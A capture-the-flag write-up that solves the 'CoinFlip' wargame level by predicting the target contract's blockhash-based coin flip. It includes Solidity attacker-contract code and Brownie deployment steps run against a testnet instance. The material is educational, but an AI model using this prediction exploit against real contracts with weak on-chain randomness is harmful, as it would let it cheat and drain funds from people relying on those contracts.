# CoinFlip

## Objectives

"To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row."

## Solution

Generating pseudo-random numbers that are completely unpredictable is a difficult problem within the blockchain. Predicting a coinflip should have a risk of failing of at least 50%, but if we know what factors are used to generate this pseudo-random number, then we can predict the coinflip accurately with a higher probability of success than the intended 50%.

In this case we can _always_ be right, given that there's 2 factors that generate the coinflip:

1. The variable FACTOR

```js
uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
```

2. The block hash of the previous block to the coinflip converted to integer

```js
uint256 blockValue = uint256(blockhash(block.number.sub(1)));
```

Our coinflip is floor of the ratio between `blockValue` and `FACTOR`

```js
uint256 coinFlip = blockValue.div(FACTOR);
bool side = coinFlip == 1 ? true : false;
```

The problem is then solved by creating an attacker contract that uses the same logic to generate coinflips, but instead to make the guess. Then the guess is plugged into the `flip()` function. 

```js
function callFlip() external {
    uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 blockVal = uint256(blockhash(block.number - 1));
    uint256 division = blockVal / factor;
    bool guess = division == 1 ? true : false;
    coinFlipContract.flip(guess);
}
```

## How I did it

I did exactly what I described in the [solution section](#solution), but I inherited from Ownable to create the `CoinFlipAttack` contract as a way to restrict calling the `callFlip()` function only from the deployer of the attacker contract. After coding the contract I did the following steps:

1. Deploy (at: `0xA8834Cc6c91bf94d4FB32D72815C2011CC1c2e15`) the attacker contract which I labeled `CoinFlipAttack.sol`

```python
coinflipattack = CoinFlipAttack.deploy(_from)
```

2. Set the instance of the contract with which to interface. My contract instance of CoinFlip, in address `0x7BDa91C53648D2a17352e4055fe6834FAABbFc95` on the Rinkeby test network.

```python
coinflipattack.setInstance('0x7BDa91C53648D2a17352e4055fe6834FAABbFc95', _from)
```

Block explorer: https://rinkeby.etherscan.io/tx/0xff97c5818da48c97f36a10a7a4fe54219744bcd6c3b2d56dcb232e6b58b95249

3. Run a loop of 10 iterations calling the `callFlip()` function, which will _always_ be right in its prediction.

```python
for _ in range(10):
    coinflipattack.callFlip(_from | {'allow_revert':True})
```

First tx: Block explorer: https://rinkeby.etherscan.io/tx/0xdc681c4c668321064d661fdb4a256bcff495460a897a1367f6d6180258456ab7

Last tx: Block explorer: https://rinkeby.etherscan.io/tx/

4. Check that we have actually won 10 times in a row by checking the `consecutiveWins` variable in the CoinFlip contract.

```python
wins_assertion = coinflip.consecutiveWins() == 10
print(wins_assertion)
```

### Submission transaction

Block explorer: https://rinkeby.etherscan.io/tx/0x137421ce33d24463170860b734fc5fe256c35479e0d53075e491c9112ad7dd34

### Minor tweaks

In order for the `callFlip()` transactions to go through, I had to increase the gas limit for live networks on my brownie config file:

```yaml
networks:
  live:
    gas_limit: "1000000"
```

And also use the parameter `{'allow_revert':True}` when calling `callFlip()`, as that scenario is a possibility in the definition of `flip()` on CoinFlip if the previous block hash matches the next block hash, I guess in order to avoid making multiple guess attempts in the same block.

```python
coinflipattack.callFlip(_from | {'allow_revert':True})
```
